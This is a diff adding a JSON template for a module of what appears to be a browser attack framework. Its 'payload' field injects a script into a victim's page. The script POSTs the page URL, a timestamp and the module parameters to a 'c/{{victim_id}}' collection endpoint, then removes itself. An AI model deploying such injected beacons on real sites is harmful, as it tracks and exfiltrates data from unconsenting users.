@@ -1,0 +1,22 @@
+{
+  "name": "Example Module",
+  "description": "Template for creating new modules - duplicate and modify this file",
+  "category": "Custom",
+  "icon": "",
+  "inputs": [
+    {
+      "id": 0,
+      "label": "Example Parameter 1",
+      "type": "string",
+      "required": true
+    },
+    {
+      "id": 1,
+      "label": "Example Parameter 2",
+      "type": "number",
+      "required": false
+    }
+  ],
+  "payload": "<div id=\"exampleModule\" style=\"color:#fff;text-align:center;font-family:sans-serif\"><h2>Example Module</h2><p>Parameter 1: {{ params[0] }}</p><p>Parameter 2: {{ params[1] }}</p></div><script>(function(){var moduleId='{{module_id}}';fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{param1:'{{ params[0] }}',param2:'{{ params[1] }}',url:window.location.href,timestamp:new Date().toISOString()}})}).finally(function(){__removeModule();});})();</script>",
+  "link": "c/{{victim_id}}"
+}
